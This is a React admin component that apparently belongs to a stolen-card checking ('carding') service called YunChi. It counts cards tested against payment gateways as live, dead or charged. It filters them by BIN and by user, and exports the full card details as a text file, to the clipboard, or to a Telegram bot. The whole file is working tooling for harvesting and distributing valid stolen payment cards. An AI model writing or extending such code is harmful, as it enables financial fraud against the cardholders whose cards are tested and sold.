import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Download,
  Loader2,
  FileText,
  Search,
  CreditCard,
  CheckCircle,
  XCircle,
  Zap,
  Copy,
  RefreshCw,
  Send,
} from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

type ExportType = "all" | "live" | "dead" | "charged";

// Charging gateways that indicate a real charge (not auth)
const CHARGING_GATEWAYS = [
  "paygate_charge",
  "stripe_charge",
  "stripelow_charge",
  "payu_charge",
  "pwgate_charge",
  "rizzup_charge",
  "paypal_charge",
  "clover_charge",
  "square_charge",
  "shopify_charge",
];

interface ExportRecord {
  card_details: string | null;
  gateway: string;
  result: string | null;
  user_id: string;
  created_at: string;
  username?: string;
}

const AdminCardExport = () => {
  const [exportType, setExportType] = useState<ExportType>("all");
  const [searchUser, setSearchUser] = useState("");
  const [searchBin, setSearchBin] = useState("");
  const [loading, setLoading] = useState(false);
  const [records, setRecords] = useState<ExportRecord[]>([]);
  const [totalCount, setTotalCount] = useState(0);
  const [exported, setExported] = useState(false);
  const [sending, setSending] = useState(false);
  const [statsLoading, setStatsLoading] = useState(false);
  const [dbStats, setDbStats] = useState<{ totalChecks: number; totalLive: number; totalDead: number; totalCharged: number } | null>(null);

  const fetchStats = async () => {
    setStatsLoading(true);
    try {
      const [totalRes, liveRes, deadRes, chargedRes] = await Promise.all([
        supabase.from("card_checks").select("id", { count: "exact", head: true }),
        supabase.from("card_checks").select("id", { count: "exact", head: true }).or("result.ilike.%live%,result.ilike.%approved%,result.ilike.%charged%"),
        supabase.from("card_checks").select("id", { count: "exact", head: true }).or("result.ilike.%dead%,result.ilike.%declined%"),
        supabase.from("card_checks").select("id", { count: "exact", head: true }).in("gateway", CHARGING_GATEWAYS).or("result.ilike.%live%,result.ilike.%approved%,result.ilike.%charged%"),
      ]);
      setDbStats({
        totalChecks: totalRes.count || 0,
        totalLive: liveRes.count || 0,
        totalDead: deadRes.count || 0,
        totalCharged: chargedRes.count || 0,
      });
    } catch (err) {
      console.error("Stats fetch error:", err);
    } finally {
      setStatsLoading(false);
    }
  };

  // Fetch stats on mount
  useEffect(() => { fetchStats(); }, []);

  // Paginated fetch to get all records (bypasses 1000 limit)
  const fetchAllRecords = async (query: any) => {
    const PAGE_SIZE = 1000;
    let allData: any[] = [];
    let from = 0;
    let hasMore = true;

    while (hasMore) {
      const { data, error } = await query.range(from, from + PAGE_SIZE - 1);
      if (error) throw error;
      if (!data || data.length === 0) {
        hasMore = false;
      } else {
        allData = allData.concat(data);
        from += PAGE_SIZE;
        if (data.length < PAGE_SIZE) hasMore = false;
      }
    }
    return allData;
  };

  const handleExport = async () => {
    setLoading(true);
    setRecords([]);
    setExported(false);

    try {
      // Build base query
      let query = supabase
        .from("card_checks")
        .select("card_details, gateway, result, user_id, created_at")
        .order("created_at", { ascending: false });

      // Apply filters based on export type
      if (exportType === "live") {
        query = query.or("result.ilike.%live%,result.ilike.%approved%,result.ilike.%charged%");
      } else if (exportType === "dead") {
        query = query.or("result.ilike.%dead%,result.ilike.%declined%");
      } else if (exportType === "charged") {
        // Charged = live results on charging gateways only
        query = query
          .in("gateway", CHARGING_GATEWAYS)
          .or("result.ilike.%live%,result.ilike.%approved%,result.ilike.%charged%");
      }

      // We need to paginate since Supabase limits to 1000 rows
      const PAGE_SIZE = 1000;
      let allData: any[] = [];
      let from = 0;
      let hasMore = true;

      while (hasMore) {
        const { data, error } = await query.range(from, from + PAGE_SIZE - 1);
        if (error) throw error;
        if (!data || data.length === 0) {
          hasMore = false;
        } else {
          allData = allData.concat(data);
          from += PAGE_SIZE;
          if (data.length < PAGE_SIZE) hasMore = false;
        }
      }

      // Fetch usernames for attribution
      const uniqueUserIds = [...new Set(allData.map((r: any) => r.user_id))];
      const userMap: Record<string, string> = {};

      // Fetch in batches of 50
      for (let i = 0; i < uniqueUserIds.length; i += 50) {
        const batch = uniqueUserIds.slice(i, i + 50);
        const { data: profiles } = await supabase
          .from("profiles")
          .select("user_id, username")
          .in("user_id", batch);

        if (profiles) {
          profiles.forEach((p: any) => {
            userMap[p.user_id] = p.username || p.user_id;
          });
        }
      }

      // Filter by username search if provided
      let finalData = allData.map((r: any) => ({
        ...r,
        username: userMap[r.user_id] || r.user_id,
      }));

      if (searchUser.trim()) {
        const q = searchUser.trim().toLowerCase();
        finalData = finalData.filter(
          (r) =>
            r.username?.toLowerCase().includes(q) ||
            r.user_id?.toLowerCase().includes(q)
        );
      }

      if (searchBin.trim()) {
        const binPrefix = searchBin.trim();
        finalData = finalData.filter(
          (r) => r.card_details?.startsWith(binPrefix)
        );
      }

      setRecords(finalData);
      setTotalCount(finalData.length);
      setExported(true);

      if (finalData.length === 0) {
        toast.info("No records found for the selected filter");
      } else {
        toast.success(`Found ${finalData.length.toLocaleString()} records`);
      }
    } catch (err) {
      console.error("Export error:", err);
      toast.error("Failed to export cards");
    } finally {
      setLoading(false);
    }
  };

  const downloadFile = () => {
    if (records.length === 0) return;

    const lines = records.map((r) => {
      const card = r.card_details || "N/A";
      const gateway = r.gateway || "N/A";
      const user = r.username || r.user_id;
      return `${card} | ${gateway} | ${user}`;
    });

    const header = `# YunChi Card Export - ${exportType.toUpperCase()}\n# Total: ${records.length}\n# Date: ${new Date().toISOString()}\n\n`;
    const content = header + lines.join("\n");

    const blob = new Blob([content], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `yunchi-${exportType}-cards-${new Date().toISOString().split("T")[0]}.txt`;
    a.click();
    URL.revokeObjectURL(url);

    toast.success("File downloaded!");
  };

  const copyToClipboard = () => {
    if (records.length === 0) return;

    const lines = records.map((r) => r.card_details || "N/A").join("\n");
    navigator.clipboard.writeText(lines);
    toast.success(`Copied ${records.length} cards to clipboard`);
  };

  const sendToTelegram = async () => {
    if (records.length === 0) return;
    setSending(true);
    try {
      const { data, error } = await supabase.functions.invoke("export-cards-telegram", {
        body: { exportType, searchUser: searchUser.trim(), searchBin: searchBin.trim() },
      });

      if (error) throw error;
      if (data?.success) {
        toast.success(`Sent ${data.count.toLocaleString()} cards to Telegram!`);
      } else {
        toast.error(data?.error || "Failed to send");
      }
    } catch (err) {
      console.error("Telegram send error:", err);
      toast.error("Failed to send to Telegram");
    } finally {
      setSending(false);
    }
  };

  const getExportLabel = (type: ExportType) => {
    switch (type) {
      case "all": return "All Cards";
      case "live": return "Live Cards";
      case "dead": return "Dead Cards";
      case "charged": return "Charged Cards";
    }
  };

  const getExportIcon = (type: ExportType) => {
    switch (type) {
      case "all": return <CreditCard className="h-4 w-4" />;
      case "live": return <CheckCircle className="h-4 w-4 text-green-500" />;
      case "dead": return <XCircle className="h-4 w-4 text-red-500" />;
      case "charged": return <Zap className="h-4 w-4 text-yellow-500" />;
    }
  };

  return (
    <Card className="bg-card border-border">
      <CardHeader>
        <CardTitle className="flex items-center justify-between">
          <span className="flex items-center gap-2">
            <FileText className="h-5 w-5 text-primary" />
            Card Export
          </span>
          {exported && (
            <Badge variant="outline" className="border-primary/50 text-primary">
              {totalCount.toLocaleString()} records
            </Badge>
          )}
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {/* DB Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <div className="p-3 rounded-lg bg-blue-500/10 border border-blue-500/30">
            <p className="text-xs text-muted-foreground">Total Checks</p>
            <p className="text-2xl font-bold text-blue-400">
              {statsLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : (dbStats?.totalChecks.toLocaleString() ?? "—")}
            </p>
          </div>
          <div className="p-3 rounded-lg bg-green-500/10 border border-green-500/30">
            <p className="text-xs text-muted-foreground">Total Lives</p>
            <p className="text-2xl font-bold text-green-400">
              {statsLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : (dbStats?.totalLive.toLocaleString() ?? "—")}
            </p>
          </div>
          <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/30">
            <p className="text-xs text-muted-foreground">Total Dead</p>
            <p className="text-2xl font-bold text-red-400">
              {statsLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : (dbStats?.totalDead.toLocaleString() ?? "—")}
            </p>
          </div>
          <div className="p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
            <p className="text-xs text-muted-foreground">Total Charged</p>
            <p className="text-2xl font-bold text-yellow-400">
              {statsLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : (dbStats?.totalCharged.toLocaleString() ?? "—")}
            </p>
          </div>
        </div>

        {/* Filters */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
          <div>
            <label className="text-sm font-medium mb-1.5 block">Export Type</label>
            <Select value={exportType} onValueChange={(v) => setExportType(v as ExportType)}>
              <SelectTrigger className="bg-secondary border-border">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="all">
                  <span className="flex items-center gap-2">
                    <CreditCard className="h-3.5 w-3.5" /> All Cards
                  </span>
                </SelectItem>
                <SelectItem value="live">
                  <span className="flex items-center gap-2">
                    <CheckCircle className="h-3.5 w-3.5 text-green-500" /> Live Cards
                  </span>
                </SelectItem>
                <SelectItem value="dead">
                  <span className="flex items-center gap-2">
                    <XCircle className="h-3.5 w-3.5 text-red-500" /> Dead Cards
                  </span>
                </SelectItem>
                <SelectItem value="charged">
                  <span className="flex items-center gap-2">
                    <Zap className="h-3.5 w-3.5 text-yellow-500" /> Charged Cards
                  </span>
                </SelectItem>
              </SelectContent>
            </Select>
          </div>

          <div>
            <label className="text-sm font-medium mb-1.5 block">Filter by User</label>
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="Username or ID..."
                value={searchUser}
                onChange={(e) => setSearchUser(e.target.value)}
                className="pl-10 bg-secondary border-border"
              />
            </div>
          </div>

          <div>
            <label className="text-sm font-medium mb-1.5 block">Filter by BIN</label>
            <div className="relative">
              <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="BIN prefix (e.g. 424242)..."
                value={searchBin}
                onChange={(e) => setSearchBin(e.target.value.replace(/\D/g, "").slice(0, 8))}
                className="pl-10 bg-secondary border-border"
                maxLength={8}
              />
            </div>
          </div>

          <div className="flex items-end">
            <Button
              onClick={handleExport}
              disabled={loading}
              className="w-full"
            >
              {loading ? (
                <Loader2 className="h-4 w-4 animate-spin mr-2" />
              ) : (
                getExportIcon(exportType)
              )}
              <span className="ml-2">
                {loading ? "Exporting..." : `Export ${getExportLabel(exportType)}`}
              </span>
            </Button>
          </div>
        </div>

        {/* Results */}
        {exported && records.length > 0 && (
          <div className="space-y-3">
            {/* Stats bar */}
            <div className="flex flex-wrap items-center gap-3 p-3 bg-secondary/50 rounded-lg border border-border">
              <Badge className="bg-primary/20 text-primary border-primary/30">
                {totalCount.toLocaleString()} Total
              </Badge>
              <Badge className="bg-green-500/20 text-green-500 border-green-500/30">
                {records.filter(r => r.result?.toLowerCase().includes("live") || r.result?.toLowerCase().includes("approved") || r.result?.toLowerCase().includes("charged")).length.toLocaleString()} Live
              </Badge>
              <Badge className="bg-red-500/20 text-red-500 border-red-500/30">
                {records.filter(r => r.result?.toLowerCase().includes("dead") || r.result?.toLowerCase().includes("declined")).length.toLocaleString()} Dead
              </Badge>
              <div className="ml-auto flex flex-wrap gap-2">
                <Button variant="outline" size="sm" onClick={copyToClipboard}>
                  <Copy className="h-3.5 w-3.5 mr-1.5" />
                  Copy
                </Button>
                <Button variant="outline" size="sm" onClick={downloadFile}>
                  <Download className="h-3.5 w-3.5 mr-1.5" />
                  Download
                </Button>
                <Button size="sm" onClick={sendToTelegram} disabled={sending} className="bg-blue-600 hover:bg-blue-700">
                  {sending ? (
                    <Loader2 className="h-3.5 w-3.5 mr-1.5 animate-spin" />
                  ) : (
                    <Send className="h-3.5 w-3.5 mr-1.5" />
                  )}
                  {sending ? "Sending..." : "Send to Bot"}
                </Button>
              </div>
            </div>

            {/* Preview table */}
            <ScrollArea className="h-[400px] rounded border border-border">
              <div className="p-3 space-y-1 font-mono text-xs">
                {records.slice(0, 500).map((r, i) => {
                  const resultLower = r.result?.toLowerCase() || "";
                  const isLive = resultLower.includes("live") || resultLower.includes("approved") || resultLower.includes("charged");
                  const isDead = resultLower.includes("dead") || resultLower.includes("declined");

                  return (
                    <div
                      key={i}
                      className={`flex items-center gap-2 px-2 py-1 rounded ${
                        isLive
                          ? "bg-green-500/5 text-green-400"
                          : isDead
                          ? "bg-red-500/5 text-red-400"
                          : "bg-secondary/30 text-muted-foreground"
                      }`}
                    >
                      <span className="w-5 text-[10px] text-muted-foreground shrink-0">
                        {i + 1}
                      </span>
                      <span className="flex-1 break-all">{r.card_details || "N/A"}</span>
                      <span className="shrink-0 text-[10px] text-muted-foreground">
                        {r.gateway}
                      </span>
                      <span className="shrink-0 text-[10px] text-primary">
                        {r.username}
                      </span>
                    </div>
                  );
                })}
                {records.length > 500 && (
                  <div className="text-center text-muted-foreground py-2">
                    Showing 500 of {records.length.toLocaleString()} — Download for full list
                  </div>
                )}
              </div>
            </ScrollArea>
          </div>
        )}

        {exported && records.length === 0 && !loading && (
          <div className="text-center py-8 text-muted-foreground">
            <FileText className="h-12 w-12 mx-auto mb-3 opacity-30" />
            <p>No records found for the selected filter</p>
          </div>
        )}
      </CardContent>
    </Card>
  );
};

export default AdminCardExport;
